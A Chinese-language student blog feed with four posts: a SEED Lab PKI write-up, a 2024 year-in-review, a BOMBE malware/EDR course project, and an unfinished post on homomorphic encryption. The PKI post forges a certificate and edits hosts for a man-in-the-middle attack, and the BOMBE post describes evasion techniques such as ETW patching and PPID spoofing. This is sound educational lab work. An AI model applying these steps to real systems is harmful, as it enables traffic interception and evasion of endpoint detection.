keyid:A5:E9:74:99:52:6F:A3:D7:0E:8A:A6:C1:F6:E6:24:5B:BE:C6:A4:03 X509v3 Subject Alternative Name: DNS:www.bank32.com, DNS:www.bank32A.com, DNS:www.bank32B.com Certificate is to be certified until Feb 11 09:25:04 2035 GMT (3650 days) Write out database with 1 new entries Data Base Updated 指令、參數 說明 openssl ca 告訴 OpenSSL 現在要簽核一張 CSR -config myCA_openssl.cnf 告訴 OpenSSL 使用 myCA_openssl.cnf 這個設定檔 -policy policy_anything 指定憑證使用的政策policy_anything 在 myCA_openssl.cnf 中有提及 -md sha256 使用 sha256 簽署憑證 -days 3650 設定有效日期為 3650 天 -in server.csr 指定 input CSR 為 server.csr -out server.crt 指定產出的憑證名為 server.crt -batch 執行 batch mode，這樣就不會中途停下來要求手動許可簽屬程序 -cert ca.crt 指定使用 CA 的憑證 ca.crt 簽署 CSR -keyfile ca.key 使用 ca.key 作為 CA 的私鑰簽署 CSR 確認簽署的憑證，應該包含 CSR 中指定的 DNS alias\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl x509 -in server.crt -text -noout Certificate: Data: Version: 3 (0x2) Serial Number: 4096 (0x1000) Signature Algorithm: sha256WithRSAEncryption Issuer: CN = www.modelCA.com, O = Model CA LTD., C = US Validity Not Before: Feb 13 09:25:04 2025 GMT Not After : Feb 11 09:25:04 2035 GMT Subject: C = US, O = Bank32 Inc., CN = www.bank32.com Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (2048 bit) Modulus: 00:ec:2a:5a:ac:70:e0:f6:99:20:e0:22:17:cd:f7:... Exponent: 65537 (0x10001) X509v3 extensions: X509v3 Basic Constraints: CA:FALSE Netscape Comment: OpenSSL Generated Certificate X509v3 Subject Key Identifier: A7:DB:BB:3C:41:57:FD:0F:32:07:B5:25:71:5C:C1:C4:C6:CE:CF:D5 X509v3 Authority Key Identifier: keyid:A5:E9:74:99:52:6F:A3:D7:0E:8A:A6:C1:F6:E6:24:5B:BE:C6:A4:03 X509v3 Subject Alternative Name: DNS:www.bank32.com, DNS:www.bank32A.com, DNS:www.bank32B.com Signature Algorithm: sha256WithRSAEncryption df:0b:02:78:52:d2:b8:9e:d7:23:56:1e:b5:11:81:ac:40:a6:... Task 4: Deploying Certificate in an Apache-Based HTTPS Website # Task 4 要實際將產生的憑證放入瀏覽器中，使其能夠辨識並使用 HTTPS 安全瀏覽信任的網頁。概念上來說，對於 CA 而言，需要將先前產生的憑證 ca.crt 提交給瀏覽器，跟瀏覽器說我相信這個 CA 簽出來的憑證；對 bank32 這間公司而言，瀏覽器會跟它要屬於它的憑證，即 server.crt，又因為 server.crt 是 CA 簽出來的，所以瀏覽器會相信，並讓用戶成功瀏覽 https://www.bank32.com 網頁。\n這個 task 會需要建置基於 HTTPS 的 apache server，Seed lab 已經將它安裝於 container，只需要根據先前 tasks 產生的內容作一些設定上的調整即可\n第一個是要修改 apache server 的設定檔，位於 image_www/bank32_apache_ssl.conf，需要調整 bank32 的資訊，包含 SSLCertificateFile 會從 /certs/server.crt 抓，相似地，SSLCertificateKeyFile 會從 /certs/server.key 取得，結果如下：\n\u0026lt;VirtualHost *:443\u0026gt; DocumentRoot /var/www/bank32 ServerName www.bank32.com ServerAlias www.bank32A.com ServerAlias www.bank32B.com ServerAlias www.bank32W.com DirectoryIndex index.html SSLEngine On SSLCertificateFile /certs/server.crt SSLCertificateKeyFile /certs/server.key \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/bank32 ServerName www.bank32.com DirectoryIndex index_red.html \u0026lt;/VirtualHost\u0026gt; # Set the following gloal entry to suppress an annoying warning message ServerName localhost 接著是 Dockerfile，建置 container 時要把 server.crt 和 server.key 複製到 container 的 /certs/ 中\nFROM handsonsecurity/seed-server:apache-php ARG WWWDIR=/var/www/bank32 COPY ./index.html ./index_red.html $WWWDIR/ COPY ./bank32_apache_ssl.conf /etc/apache2/sites-available COPY ./certs/server.crt ./certs/server.key /certs/ RUN chmod 400 /certs/server.key \\ \u0026amp;\u0026amp; chmod 644 $WWWDIR/index.html \\ \u0026amp;\u0026amp; chmod 644 $WWWDIR/index_red.html \\ \u0026amp;\u0026amp; asenmod ssl \\ \u0026amp;\u0026amp; a2ensite bank32_apache_ssl CMD tail -f /dev/null 根據上面調整的內容，把 server.crt 以及 server.key 移到 image_www/certs/ 中\n使用 dcbuild 建置環境，並以 dcup 將 container 啟動\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dcbuild Building web-server Step 1/7 : FROM handsonsecurity/seed-server:apache-php ---\u0026gt; 2365d0ed3ad9 Step 2/7 : ARG WWWDIR=/var/www/bank32 ---\u0026gt; Using cache ---\u0026gt; 16a0763ac43d Step 3/7 : COPY ./index.html ./index_red.html $WWWDIR/ ---\u0026gt; Using cache ---\u0026gt; 718a24968c38 Step 4/7 : COPY ./bank32_apache_ssl.conf /etc/apache2/sites-available ---\u0026gt; Using cache ---\u0026gt; 844a04cc06cf Step 5/7 : COPY ./certs/server.crt ./certs/server.key /certs/ ---\u0026gt; d81c4562174e Step 6/7 : RUN chmod 400 /certs/server.key \u0026amp;\u0026amp; chmod 644 $WWWDIR/index.html \u0026amp;\u0026amp; chmod 644 $WWWDIR/index_red.html \u0026amp;\u0026amp; a2ensite bank32_apache_ssl ---\u0026gt; Running in 6e1c1867ea71 Enabling site bank32_apache_ssl. To activate the new configuration, you need to run: service apache2 reload Removing intermediate container 6e1c1867ea71 ---\u0026gt; 7ed73be4cc19 Step 7/7 : CMD tail -f /dev/null ---\u0026gt; Running in a8c9a1796b6f Removing intermediate container a8c9a1796b6f ---\u0026gt; 362809e7726b Successfully built 362809e7726b Successfully tagged seed-image-www-pki:latest [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dcup -d Creating network \u0026#34;net-10.9.0.0\u0026#34; with the default driver Creating www-10.9.0.80 ... done 透過 dockps 可查看 container ID，以 docksh \u0026lt;id\u0026gt; 連線進去\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dockps 0cc4d835efca www-10.9.0.80 [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ docksh 0c root@0cc4d835efca:/# 進到 container 後，要開啟 apache service，使用指令 service apache2 start，它會要求輸入 server.key 的密碼，密碼為 dees\nroot@0cc4d835efca:/# service apache2 start * Starting Apache httpd web server apache2 Enter passphrase for SSL/TLS keys for www.bank32.com:443 (RSA): * root@0cc4d835efca:/# 打開 firefox 瀏覽器，嘗試連線 https://www.bank32.com ，會發現還是無法連線，這是因為我們還沒告知瀏覽器我們的 CA 是可以信任的 在網址列輸入 about:preferences#private，找到憑證的區域，點擊 View Certificate 在 Authorities 標籤內，點擊 Import 匯入 ca.crt 這張憑證 這邊要選擇 \u0026ldquo;Trust this CA to identify websites\u0026rdquo;，這樣瀏覽器就會信任這個 CA 所頒發的憑證的網站 重新瀏覽 https://www.bank32.com ，看到綠色的 Hello World 代表成功連線 Task 5: Launching a Man-In-The-Middle Attack # Task 5 會說明 PKI 可以阻擋中間人攻擊，先簡單說明這個 Task 的攻擊場景：接下來有三個人物：用戶 (Alice)、中間人 (MITM)、伺服器 (server)，Alice 打算使用 server 的服務，MITM 打算從中作梗，讓 Alice 存取的服務有問題，在這個 task 中，假設 server 是師大資工 www.csie.ntnu.edu.tw ，Alice 想要瀏覽該網頁，而中間人（也就是自己）打算將該網站導到別的地方，如果成功導向其他地方，那代表 MITM 攻擊成功，否則表示 PKI 成功阻擋了 MITM 攻擊。\n接著要思考如何進行攻擊，有兩個方法可以做到，一個是直接攻擊路由，另一個方法是攻擊 DNS，這個 task 中會以後者作為範例。假設中間人有方法修改 Alice 本機上的 /etc/hosts（VM 上的 /etc/hosts/），並新增 10.9.0.80 www.csie.ntnu.edu.tw，如此當 Alice 瀏覽 https://www.csie.ntnu.edu.tw 時，就會被導到 10.9.0.80，也就是 MITM 自架的服務\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ sudo vim /etc/hosts 10.9.0.80 www.csie.ntnu.edu.tw 打開 firefox 瀏覽器，嘗試連線 https://www.csie.ntnu.edu.tw ，會發現並沒有如 Task 4 一樣顯示綠色的 Hello World 頁面，表示 PKI 有成功擋下 MITM 攻擊 進到 Task 6 之前稍微說明一下原因：原因就是因為 https://www.csie.ntnu.edu.tw 並無法提交合格的憑證，所以 PKI 將它擋了下來\nTask 6: Launching a Man-In-The-Middle Attack with a Compromised CA # Task 6 就是要幫假服務偽造假憑證，使 MITM 攻擊成功，過程基本上就是仿造 Task 1-4\n首先建立向 CA 發出憑證簽署要求的 CSR (ntnu.csr) 及私鑰 (ntnu.key)，再讓 CA 簽署該 CSR，產生憑證 ntnu.crt\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -newkey rsa:2048 -sha256 -keyout ntnu.key -out ntnu.csr -subj \u0026#34;/CN=www.csie.ntnu.edu.tw/O=NTNU CSIE/C=TW\u0026#34; -passout pass:dees Generating a RSA private key ..........................................................................................+++++ .............................................................................................................................................................................+++++ writing new private key to \u0026#39;ntnu.key\u0026#39; ----- [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ openssl ca -config myCA_openssl.cnf -policy policy_anything -md sha256 -days 3650 -in ntnu.csr -out ntnu.crt -batch -cert ca.crt -keyfile ca.key Using configuration from myCA_openssl.cnf Enter pass phrase for ca.key: Check that the request matches the signature Signature ok Certificate Details: Serial Number: 4097 (0x1001) Validity Not Before: Feb 14 15:08:24 2025 GMT Not After : Feb 12 15:08:24 2035 GMT Subject: countryName = TW organizationName = NTNU CSIE commonName = www.csie.ntnu.edu.tw X509v3 extensions: X509v3 Basic Constraints: CA:FALSE Netscape Comment: OpenSSL Generated Certificate X509v3 Subject Key Identifier: 53:48:8B:B3:ED:7F:8C:1E:19:7C:FA:84:F7:05:BC:59:69:6E:3F:51 X509v3 Authority Key Identifier: keyid:D6:9E:DC:28:B8:0B:6E:67:00:F1:F3:C2:83:AC:7C:66:89:AC:D4:FF Certificate is to be certified until Feb 12 15:08:24 2035 GMT (3650 days) Write out database with 1 new entries Data Base Updated 接著修改 container 設定，Dockerfile 設定如下\nFROM handsonsecurity/seed-server:apache-php ARG WWWDIR=/var/www/bank32 COPY ./index.html ./index_red.html $WWWDIR/ COPY ./bank32_apache_ssl.conf /etc/apache2/sites-available COPY ./ntnu_apache_ssl.conf /etc/apache2/sites-available COPY ./certs/server.crt ./certs/server.key /certs/ COPY ./certs/ntnu.crt ./certs/ntnu.key /certs/ RUN chmod 400 /certs/server.key \\ \u0026amp;\u0026amp; chmod 400 /certs/ntnu.key \\ \u0026amp;\u0026amp; chmod 644 $WWWDIR/index.html \\ \u0026amp;\u0026amp; chmod 644 $WWWDIR/index_red.html \\ \u0026amp;\u0026amp; a2enmod ssl \\ \u0026amp;\u0026amp; a2ensite bank32_apache_ssl \\ \u0026amp;\u0026amp; a2ensite ntnu_apache_ssl CMD tail -f /dev/null apache server 也要新增 https://www.csie.ntnu.edu.tw [02/14/25]seed@VM:~/.../image_www$ cp bank32_apache_ssl.conf ntnu_apache_ssl.conf [02/14/25]seed@VM:~/.../image_www$ vim ntnu_apache_ssl.conf ntnu_apache_ssl.conf 設定如下\n\u0026lt;VirtualHost *:443\u0026gt; DocumentRoot /var/www/bank32 ServerName www.csie.ntnu.edu.tw DirectoryIndex index.html SSLEngine On SSLCertificateFile /certs/ntnu.crt SSLCertificateKeyFile /certs/ntnu.key \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/bank32 ServerName www.csie.ntnu.edu.tw DirectoryIndex index_red.html \u0026lt;/VirtualHost\u0026gt; # Set the following gloal entry to suppress an annoying warning message ServerName localhost 一樣根據 Dockerfile 的設定，將 ntnu.crt、ntnu.key 複製到 image_www/certs 中\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ cp ntnu.crt ntnu.key ./image_www/certs/ 最後 dcbuild 建置 container，dcup 啟動\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dcbuild Building web-server Step 1/9 : FROM handsonsecurity/seed-server:apache-php ---\u0026gt; 2365d0ed3ad9 Step 2/9 : ARG WWWDIR=/var/www/bank32 ---\u0026gt; Using cache ---\u0026gt; 16a0763ac43d Step 3/9 : COPY ./index.html ./index_red.html $WWWDIR/ ---\u0026gt; Using cache ---\u0026gt; 718a24968c38 Step 4/9 : COPY ./bank32_apache_ssl.conf /etc/apache2/sites-available ---\u0026gt; Using cache ---\u0026gt; 844a04cc06cf Step 5/9 : COPY ./ntnu_apache_ssl.conf /etc/apache2/sites-available ---\u0026gt; 4f12dd172ab3 Step 6/9 : COPY ./certs/server.crt ./certs/server.key /certs/ ---\u0026gt; 72f13efc4133 Step 7/9 : COPY ./certs/ntnu.crt ./certs/ntnu.key /certs/ ---\u0026gt; cff8cc3d7e59 Step 8/9 : RUN chmod 400 /certs/server.key \u0026amp;\u0026amp; chmod 400 /certs/ntnu.key \u0026amp;\u0026amp; chmod 644 $WWWDIR/index.html \u0026amp;\u0026amp; chmod 644 $WWWDIR/index_red.html \u0026amp;\u0026amp; a2ensite bank32_apache_ssl \u0026amp;\u0026amp; a2ensite ntnu_apache_ssl ---\u0026gt; Running in baafc9959d27 Enabling site bank32_apache_ssl. To activate the new configuration, you need to run: service apache2 reload Enabling site ntnu_apache_ssl. To activate the new configuration, you need to run: service apache2 reload Removing intermediate container baafc9959d27 ---\u0026gt; b781c9decb84 Step 9/9 : CMD tail -f /dev/null ---\u0026gt; Running in afe500be0d41 Removing intermediate container afe500be0d41 ---\u0026gt; a79c3a37a3b6 Successfully built a79c3a37a3b6 Successfully tagged seed-image-www-pki:latest [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dcup -d Creating network \u0026#34;net-10.9.0.0\u0026#34; with the default driver Creating www-10.9.0.80 ... done docksh \u0026lt;id\u0026gt; 連進 container 後，使用指令 service apache2 start 啟用 apache 服務\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dockps 5b31c4d5ea6f www-10.9.0.80 [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ docksh 5b root@5b31c4d5ea6f:/# service apache2 start * Starting Apache httpd web server apache2 Enter passphrase for SSL/TLS keys for www.csie.ntnu.edu.tw:443 (RSA): * root@5b31c4d5ea6f:/# 重新瀏覽 https://www.csie.ntnu.edu.tw ，發現成功顯示 Hello World 頁面，表示 MITM 攻擊成功 ","date":"2025-02-15","externalUrl":null,"permalink":"/posts/seedlab-pki/","section":"Blog Posts","summary":"","title":"Seed Lab PKI Writeup","type":"posts"},{"content":"按照慣例需要在年末回顧一下今年做了哪些事情，這次先用一張表格來呈現幾個我覺得比較重大的事情\n軌跡 # 月份 事蹟 Jan 19 我們。他們：是我覺得畢業後最靠近的時候了27 理想混蛋奇異點高雄場演唱會：文化幣帶我解鎖人生新成就 Feb 24 還騎台北：惹到中研院的水溝蓋翻了兩圈半 Mar 01 跟小師妹回中興02 台大就業博覽會：真豐富09 SITCON 2024：沒錯我終於敢參加了22 師大就業博覽會：這場其實是在逛無界塾的吧！ Apr 09 CPE12 HP 實習面試19 精誠 實習面試 May 01 客家社會探究活動：成為竹編 master 的必經之路02 奧義 實習面試06 專題論文送出21 台灣智園 實習面試23 叡揚 實習面試 Jun 01 慈濟畢業典禮 Jul 04 手機壞掉：從此手札多了消失的那三年05 找出最後的答案：結果發現是無解08 實習開始12 YOUNGSO 台北演奏會 Aug 13-14 Asia JCIS：可能是這輩子的學術巔峰25 送機：人生第一次到機場，不是為了搭飛機，Kenneth 我的第一次獻給你了 Sep 16 系上暑期企業實習成果分享會：在系上第一場 invited talk Oct 31 推甄 師大資工逕取 Nov 04 推甄 臺科資管逕取06 推甄 臺大電機正取：話說我以為是詐騙，誰叫他提早兩個禮拜破哽07 推甄 清大資安面試09-10 HITCON 菁英人才技術交流活動09 推甄 臺科資工面試13 推甄 交大資安正取：如果不是在公司我一定大叫18 推甄 臺科資工正取20 文山特教學校參訪21 理學院實習成果發表會：在理學院第一場 invited talk23 IPAS 初級資訊安全工程師考照26 推甄 交大報到 Dec 04 IPAS 初級資訊安全工程師證照 GET06 推甄 簽下碩班實驗室賣身契20 BOMBE 拿下 EDR 冠軍25 兵役體檢27 實習結束 感覺今年不會再長篇大論了\n從表格上可以看到滿明顯的分界，上半年一心就是在找實習，下半年就是一心在搞推甄，身為一名大學學生，似乎沒看到屬於他這個階段最應該做到的事情：好好讀書？\n3/1 國中老師是一語道破我現階段的問題，太貪心了，我的能力有限、時間有限，不可能說看到的所有東西都可以承接下來，雖然當初是勸說我趕快放掉教程專心在資工上面，但其實一路上這個問題都存在，就像年中為了實習、學業、教程和推甄的事情覺得自顧不暇卻又不知如何取捨，最後在躊躇之間才慌亂選擇，只能慶幸今年的運氣還不錯，讓我實習完成了、學業撐過去了，研究所也有一個好結果\n話說，下半年因為八月準備 conference 又兼顧實習的關係，忙到甚至找不到時間剪頭髮，就索性換一個髮型，也晉升長髮男的行列，缺點就是每天洗完澡花一堆時間吹頭髮、早上也要提早十分鐘處理它，一直唉沒時間的人卻又做出這麼浪費時間的決定 :) 如果有人知道男生長髮可以怎麼處理的麻煩找我交流一下\n感觸 # 大學生都在壓死線，今年我也壓了不少，連論文和推甄審查資料都可以這樣玩，學校課業不用期待我有多好的表現（這是自暴自棄的節奏）。以前的我不壓死線，在大學慢慢的會在死線前掙扎，趕在最後十秒鐘交出一份還可以看的成果，你以為上了大三大四會比較好嗎？並不會，大三開始學會看著死線從我旁邊經過，不管心中多大力的吶喊，外表也會故作鎮定的說「就讓它過去吧！」，嗯嗯沒錯我學會了視若無睹，只要成績還可以看我不會在意那一點點遲交，事後補交打個八折沒事啦！大四的我更厲害了，只要同一堂課幾個死線從旁邊飄過去就會跟這堂課說掰掰，原來退選才是解決問題的方法，沒想到這個道理到了大四才懂，這邊先跟下半年退選的課、放棄的事情說聲抱歉！然後年紀比我小的看到這篇文章不要亂學，我有本錢\n一樣是在後半年突然覺得「大家都在各自的道路上努力著」是一句很難過的話，以前覺得它很激勵，因為時間到了，本來每個人都會往各自的目標前往，自己也不例外，這句話表達的是大家都還在成長著，明明是一件好事；但多愁善感的我突然覺得這句話也表示「大家」都在漸行漸遠，走在同一條道路上的人在遇到叉路之後好像真的很難能再次走在一起\n新希望 # 做人不能貪心所以一樣給三個就好\n資安技術上還是要更精進 經過高等資安攻防的洗禮，拿到一大堆關鍵字，接下來的一年有很多東西可以好好消化，加上準備進入實驗室，應該又會是一次大躍進了 不要忘記在教育上的熱忱 雖然教育學程修不完，但不能忘記因為誤打誤撞進到師大而獲得的禮物，希望以後到研究所還有展現教育長才的地方 送自己永久性的畢業禮物 又是人生的轉銜階段，希望可以在畢業後到實驗室工作還沒完全下來前，學一個 喔對，我會順利畢業的，相信我！順便祝乖乖待在 C203 的考研小分隊趕快拿到好消息\n2024 謝謝你耶！這一年我玩得還算開心！\n","date":"2024-12-31","externalUrl":null,"permalink":"/posts/2024-review/","section":"Blog Posts","summary":"","title":"2024 年度回顧","type":"posts"},{"content":" 關於 BOMBE # 高等資安攻防這門課的期末專題採用 attack \u0026amp; defense 的方式進行，平台是一個稱為 BOMBE 的競賽，BOMBE 全名 Battle of Malware Bypass ans EDR，主辦方會給予特定環境的 VM，參賽者需要開發 Malware 偷取指定位置的 flag，或開發 EDR 偵測 Malware 的攻擊，這是奧義智慧科技在今年的 DEFCON (DEFCON 32) 舉辦的競賽，這次拉到師大的課堂上，透過五個 challenge (Malware * 3, EDR * 2) 以及參賽組別間相互競技作為本次課程期末專題\n專題差不多為期一個月左右，一個禮拜的時間寫基本 challenge、一個禮拜寫進階 challenge，一個禮拜進行最後開發，進行組別間的競賽，BOMBE 負責團隊甚至很用心地提供範例程式幫助我們著手專題，撰寫 document 說明環境建置、競賽規則以及學習資源，針對 Malware 和 EDR 都提供了不同技巧供我們做為入門\n這次跟兩個碩班學長組隊進行，雖然分工比較像是各自寫各自的程式，有問題再討論，但最後還是拿下 EDR 組第一名；Malware 組第四名！\nMalware 開發 # Malware 開發部分會針對嘗試的技術進行說明，雖然這部分剛好都沒成功\nETW Patch # 思路 # Challenge File Access Monitor 提到 EDR 會開 ETW 去監測 malware 的行為，要避免 ETW 的偵測其中一個做法是 ETW Patch，ETW 會透過 EtwEventWrite 在事件建立時寫入，過程中進行偵測，而 malware 可以透過修改 EtwEventWrite，阻止事件被寫入，進而讓 ETW 偵測不到。我們透過將 ETWEventWrite 第一個 instruction 改為 RET，在進入 ETWEventWrite 後就直接離開，避開原先 ETWEventWrite 會做的事情\n實作 # 344 行透過目前的 process 取得 process handle、355 行取得 ntdll.dll 位址，呼叫 PatchETW 進行後續任務 333 行會透過 GetEtwEventWriteOffset 尋找 EtwEventWrite 的位址，即尋找與 ntdll.dll 的 base address 差距 (offset)，並透過 ModifyRemoteMemory 將 EtwEventWrite 的第一個 byte 改成 0xC3，即 EtwEventWrite 第一個 instruction 為 RET 接下來要了解 PatchETW 中呼叫的自製兩個函式，一個是 GetEtwEventWriteOffset，一個是 ModifyRemoteMemory GetEtwEventWriteOffset 會尋找 EtwEventWrite 與 ntdll.dll base address 的差距，函式中有兩個變數，一個是 localNtdllAddress，另一個是 localNtdllBaseAddress，兩個相減即為 EtwEventWrite 與 ntdll.dll base address 的差距 其中 localNtdllAddress 會透過 GetLibraryAddress 取得 ntdll.dll 中 EtwEventWrite 的位址 另一個是 localNtdllBaseAddress，它會透過 GetRemoteNtdllBaseAddress 從當前 process 中尋找 ntdll.dll module 的 base address， ModifyRemoteMemory 函式會修改 EtwEventWrite 的第一個 instruction。311 行會將 virtual protect 打開，316 行會嘗試更改目標 byte 結果 # 未成功，仍可從 process explorer 查看到 malware 程序。 PPID Spoofing # 思路 # 這部分並不是為了 challenge 而設計，只是純粹 ETW Patch 寫不出來想要讓 malware 新增一些 feature 而進行的嘗試。PPID Spoofing 目標是把 malware 的 parent process 改掉，如果 EDR 有透過 parent process 辨別 malware，就有機會透過這種策略規避。\n實作 # Parent process 的資訊會存在 process thread attribute list 中，這次做法主要是透過 InitializaProcThreadAttributeList 初始化創建一個經設計的 process thread attribute list，再透過 UpdateProcThreadAttributeList 更改 process 的 thread attribute list，達到更換 parent process 的效果。其中 311 行第一次呼叫 InitializeProcThreadAttributeList 的原因是需要得到 lpSize，真正執行初始化為 314 行第二次呼叫 InitializeProcThreadAttributeList\n結果 # 未成功，卡在 CreateProcess 遇到讀取不可讀的記憶體位置。 Memory Mapping # 這部分是兩位學長的嘗試\n思路 # 在編寫 malware 時，由於不清楚 EDR 的運作內容，所以在編寫程式時，假設 EDR 是以監控特定的 SYSCALL 以及特定路徑檔案的存取操作。嘗試 Memory Mapping 的方法，使用 shellcode 將檔案內容載入到記憶體中，避免掉 EDR 可能監控的 SYSCALL\n實作 # 建立一個名為 MalwareMomory 記憶體映射檔案，使用 ViewAccessor shellcode 寫入到記憶體映射的位置，搭配 VirtualAlloc 將虛擬記憶體空間進行分配， CreateThread 建立 thread 執行 shellcode。\n結果 # 未成功，在 VirtualAlloc 時遇問題，並在上傳後仍會被偵測。\nEDR 開發 # EDR 的 challenge 中進階提剛好有寫出來，所以會針對解題策略與作法進行說明\nBypass File Access Monitor # 題目 # Bypass File Access Monitor 說到 malware 會產生一支子程序 cmd.exe，讓 cmd.exe 去複製目標檔案到其他地方，再去讀取內容，並把答案回傳\n思路 # 偵測 cmd.exe 這支程序，一旦被建立起來，就去檢查他的行為是否包含複製，且複製目標檔案是否為 challenge 的目標檔案，如果是則猜測其 parent process 為 malware，找出 parent process name 並回傳\n實作 # processStartedHandler 會在所有 process 開始執行時被 ETW 偵測到，因為我需要偵測 cmd.exe 這支 process，所以在這個函式中新增了第 91 至 113 行的程式碼，93 行檢查如果這支 process 名字是 cmd.exe，那就需要進行更進一步的判斷，如果做的事情包含複製 (args.Contains(“copy”)) 且複製目標為 challenge 目標檔案，此處以 challenge2 為例 (args.Contain(“login.data”))，則猜測其為惡意程式，需注意的是如果直接回傳該 process 會抓到 cmd.exe，真正的 malware 應該是它的 parent process，所以最後回傳 parent process name 即可通過 challenge\n結果 # 成功\n心得 # 之前嘗試的資安競賽都是 Jeopardy 類型的 CTF，沒打過 attack \u0026amp; defense 或 KoH，這次的 BOMBE 算是我第一次有實際攻防的競賽。不同的點是 Jeopardy 可以直接享用一個完整的平台，但 attack \u0026amp; defense 需要事先準備一個環境，各種入侵手法也需要自己思考，比起 Jeopardy 更廣也更難實作，當然防禦層面也是 Jeopardy 比較少有機會玩到的，可以自己寫一個簡單的 EDR 偵測 malware，這次真的是一個很寶貴的經驗\n其實一開始是想好好打 malware，因為比起 EDR 要猜測 malware 如何攻擊，malware 的目標很明確就是去偷 flag 而已，加上自己沒什麼試過當壞人的角色，想趁這個機會好好寫一個 malware 出來，然後哪一天晚上傳一句「學長，我寫了一支 malware，你要試試嗎？」，但很可惜的是寫 malware 的過程一直卡關，有時候是程式不會動，有時候是偷不到資料，或是 malware 的一些機制啟動不了，反而是心血來潮一個早上寫 EDR 的 challenge，非常順利的第一次就過關，這算是過程中意想不到的事情\n這趟路途中也發現，當我寫好一支 malware 要進行測試其實是比較容易的，因為只要執行下去並觀察是否有依照預期行為動作即可，比如說 PPID Spoofing 的功能開發完，就跑下去執行並監控該 process 的 PPID 是不是有成功被我更改，但相對的當我寫好一支 EDR 想要檢測是否能抓到 malware，似乎還需要把 malware 開發出來才能測試，當然要測試 malware 是否會被 EDR 抓到也是一樣的概念，只是就功能的正確性而言，似乎對於開發 malware 的要求比較低。這是我在最後一週因為寫不出 malware 轉戰 EDR 的小心得，並於期末分享那天提出來，當天 NiNi 說如果要測 EDR 有沒有寫好，其實 malware 網路上找一大堆，因為之前為了訓練某些 detector，其實也有相對應資料集，不會怕找不到，EDR 的概念也一樣，我想逃過哪一家的 EDR，就直接買一台過來玩一玩就好，要測多少次都不是問題\n不過最重要的應該是認知到攻防是一體的概念，不會說我想當純的紅隊或純的藍隊，畢竟攻擊方要知道藍隊怎麼防禦才能進化它的武器；防禦方要知道紅隊怎麼攻擊才能布好防禦網\n","date":"2024-12-30","externalUrl":null,"permalink":"/posts/bombe/","section":"Blog Posts","summary":"","title":"113-1 高等資安攻防 期末專題 BOMBE","type":"posts"},{"content":" What is Fully Homomorphic Encryption? # Homomorphic encryption allows operations to be performed directly on encrypted data, so the results are the same as if the operations had been performed on the plaintext. Fully homomorphic encryption (FHE) extends this to allow operations of arbitrary depth and type.\nMotivation # Cloud computing allows users to overcome the limitations of local devices. Even if their hardware is not powerful enough, they can leverage cloud computing to process data via third parties and achieve the desired results. However, with the rise of cloud computing, security has become a critical issue.\nI will use the following simple scenario to explain the motivation step by step.\nAlice has a piece of data, say a is 3 and b is 5, that she needs to send to a third party, Bob, for processing. In a typical cloud computing, Alice sends the data to Bob, who processes it and returns the results 8 to Alice.\nHowever, Alice worries that if someone intercepts the data during transmission, it could be exposed, posing a significant risk. To address this, Alice encrypts the data before sending it to Bob. Bob then decrypts the data, processes it, re-encrypts the results, and sends them back to Alice. Alice decrypts it and gain the final result. This is a standard encryption process.\nBut Alice still feels that exposing the raw data to Bob is risky. She needs a way to process the data while it remains encrypted - here is where homomorphic encryption comes in.\nIt seems everything is now more secure with FHE. Unfortunately, we figure out a potential risk as the following consideration describes. What if Alice wants Bob to perform an addition operation, but Bob performs a multiplication operation instead? Alice has no way to verify that Bob has performed the correct operation or not.\nWhile FHE does help solve a significant security issue, there remains a potential loophole, how can we ensure that the third-party computation is exactly what the data owner intended? This is the core problem our research addresses. Let me summarize all requirement of this problem in three categories.\nWe need the whole process to be performed under encryption so that no one else can see the raw data between transmission. We need homomorphic encryption, or fully homomorphic encryption to prevent the third party from seeing raw data. We need an additional validation step to verify if the third party runs the operation as the data owner intends. Solution # FHEwEC involves five algorithms: Setup, Encrypt, Evaluate, Decrypt, and Validate. Unlike traditional FHE, we make several modifications at each step to enable the new validation mechanism in the final step. Overall, we achieve validation through data duplication and deconstruction.\nFirst is Setup. The Setup phase generates three keys: a public key for encryption, a private key for decryption, and an evaluation key for FHE operations.\nIn the Encryption phase, there are four steps: policy formulation, data duplication, data deconstruction, and finally, FHE encryption.\nThe policy formulation uses a bloom filter to generate a number or bit array, which informs the third party of the number of message blocks and which ones are necessary. For example, as the slide shows, the bloom filter might indicate that under addition, eight message blocks will be used, with only the first four relevant, while the remaining four are random noise.\nNext is data duplication. The data owner duplicates the original data into s+t copies, where s and t will be explained shortly. In the example, assume there is a data 8, and we duplicate it 4 times.\nIn the deconstruction step, the data duplications are deconstructed based on addition and multiplication operations. The number of duplications undergoes addition deconstruction is s, while the number of duplications undergoes multiplication deconstruction is t. Finally, the total number of message blocks is N. In the example, two copies are deconstructed using addition, and two using multiplication, with each deconstruction splitting the data into two parts.\nFor instance, 2 + 6, 3 + 5, 1 * 8, and 2 * 4 are all equals 8\nIn this example, s is the number of additions, which is 2, and t is the number of multiplications, also equals to 2, while the total number of message blocks, N, is 8.\nReferring back to policy formulation, the policy indicated that the first four message blocks should be used, which corresponds to 2, 6, 3, and 5. These blocks were indeed created through addition, aligning with our intention to perform addition on the data.\nFinally, all message blocks undergo FHE encryption, indicated by black background color in the slide.\nThe third algorithm, Evaluate, is used by the third party.\nThis algorithm has two steps, policy checking and fully homomorphic evaluation.\nDuring policy checking, the third party performs an AND operation on the policies of the two pieces of data, yielding the policy to be used for the upcoming operations. The AND operation is necessary because it identifies the data that both parties have agreed can be used. As the following picture shows, the first policy p1 is the same as the one we previously showed. For convenience, I set all bits of the second policy p2 into 1. After AND operation, the result policy indicates that there are totally 8 message blocks, where the first four will be used later.\nNext is homomorphic evaluation. The third party selects the relevant message blocks according to the policy and 